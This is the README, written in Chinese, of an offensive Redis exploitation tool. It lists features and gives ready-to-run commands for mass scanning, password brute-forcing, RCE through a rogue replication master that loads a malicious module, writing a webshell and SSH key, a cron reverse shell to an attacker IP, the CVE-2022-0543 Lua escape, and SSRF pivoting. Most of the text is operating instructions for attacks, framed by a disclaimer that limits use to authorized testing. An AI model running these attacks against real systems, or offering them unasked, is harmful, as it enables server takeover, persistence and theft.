# redis_tool

Redis 未授权访问一站式测试工具：**探测 → 分诊 → 利用 → 一键模板**。
纯 Python 标准库实现，零第三方依赖。

> ⚠️ **仅用于已授权的渗透测试 / CTF / 自有靶场。**
> 未经授权攻击他人系统属于违法行为，使用者自行承担全部责任。

---

## 特性

| 能力 | 说明 |
|---|---|
| 探测 / 指纹 | PING 判未授权 + INFO 版本/OS/配置 |
| 目录探测 | `CONFIG SET dir` + `SAVE` 判断目录是否存在 / 可写 |
| 主从复制 RCE | 内置 rogue master，下发 `exp.so` → `MODULE LOAD` → `system.exec` |
| 无损写文件 | 主从复制写无 RDB 头污染的文件（webshell / authorized_keys / sethc.exe / shadow） |
| webshell / cron / ssh | 一键写 webshell、计划任务反弹、SSH 公钥 |
| CVE-2022-0543 | Debian/Ubuntu 的 Lua 沙箱逃逸，无主从直接命令执行 |
| SSRF | 用 `SLAVEOF` 让目标连接指定 host:port，做内网探测 |
| 一键模板 | `webshell / sshkey / cron / shadow / sethc` |
| 弱口令爆破 | `--wordlist` 字典 |
| 网段批量 | `--cidr` / 目标填 CIDR，多线程并发 |
| 代理 | `--proxy socks5://...` 或 `http://...`（如 chisel 隧道） |
| 编译 exp.so | `--build-exp` 用 RedisModulesSDK 现场编译 |
| auto 模式 | 自动尝试所有可行利用，成功给下一步、失败给计划 |
| 健壮性 | 连接失败/文件缺失/非法输入均给出可读提示，不抛 traceback |

## 环境要求

- Python 3.7+
- 无第三方依赖（仅标准库）
- 主从复制 RCE 需要攻击机可被目标回连（NAT 环境请用公网 VPS 作为回连地址）

## 用法

```bash
python3 redis_tool.py <目标> [动作] [选项]
```

- **目标**：IP 或 CIDR（如 `172.22.2.0/24`）
- **动作**（默认 `auto`）：
  `auto` / `probe` / `scan` / `dir` / `webshell` / `cron` / `ssh` / `lua` / `ssrf` / `replica` / `build`

### 示例

```bash
# 自动全试 + 给出下一步（最常用）
python3 redis_tool.py 127.0.0.1

# 只看指纹
python3 redis_tool.py 127.0.0.1 probe

# 目录探测
python3 redis_tool.py 127.0.0.1 dir

# 网段扫描 + 弱口令
python3 redis_tool.py 10.0.0.0/24 scan --wordlist pass.txt

# 主从复制 RCE（lhost 填回连地址）
python3 redis_tool.py 1.2.3.4 replica --lhost 5.6.7.8 --lport 443 --cmd "id"

# 无损写 webshell
python3 redis_tool.py 1.2.3.4 webshell --lhost 5.6.7.8 --dirs /var/www/html

# 写 SSH 公钥
python3 redis_tool.py 1.2.3.4 ssh --lhost 5.6.7.8 --pubkey ~/.ssh/id_rsa.pub

# 计划任务反弹
python3 redis_tool.py 1.2.3.4 cron --lhost 5.6.7.8 --rev-ip 5.6.7.8 --rev-port 4444

# CVE-2022-0543 Lua 逃逸
python3 redis_tool.py 1.2.3.4 lua --cmd "id"

# 通过代理扫内网
python3 redis_tool.py 1.2.3.4 --proxy socks5://127.0.0.1:1080 dir

# 现场编译 exp.so
python3 redis_tool.py x build --sdk /path/to/RedisModulesSDK
```

### 常用选项

| 选项 | 说明 |
|---|---|
| `--lhost IP` | 回连地址（VPS 公网 IP）；主从复制/写文件用 |
| `--lport N` | 回连端口（默认 443，需与目标回连能力匹配） |
| `--pass PWD` | Redis 密码 |
| `--wordlist F` | 弱口令字典 |
| `--proxy URL` | `socks5://host:port` 或 `http://host:port` |
| `--rev-ip IP` | 反弹 shell 地址（cron 用） |
| `--rev-port N` | 反弹 shell 端口 |
| `--pubkey F` | SSH 公钥文件 |
| `--cmd C` | 执行命令（默认 `id`） |
| `--dirs "a,b"` | 自定义目录探测列表 |
| `--exp F` | exp.so 路径（默认 `exp.so`） |
| `--debug` | 显示异常堆栈 |
| `-o F` | 结果写 JSON |

## 工作原理

1. **探测**：连 Redis，`PING` 返回 `PONG` 即未授权；`INFO` 取版本。
2. **分诊**：`CONFIG SET dir <path>` 判断目录可 chdir，再 `SAVE` 判断可写。
3. **利用**：
   - 目标能回连攻击机 → 主从复制（伪造 master 下发 payload → `MODULE LOAD`）。
   - 不能回连但可写文件 → 写 webshell / cron / 公钥。
   - 目标是 Debian/Ubuntu → CVE-2022-0543 Lua 逃逸。
4. **auto**：按「探测 → 分诊 → 各利用尝试」的顺序自动执行，并汇总「成功项 + 下一步」。

## 免责声明

本工具仅供安全学习、授权测试与 CTF 使用。请勿用于任何未经授权的目标。
因使用本工具产生的任何后果由使用者自行承担。

## License

MIT
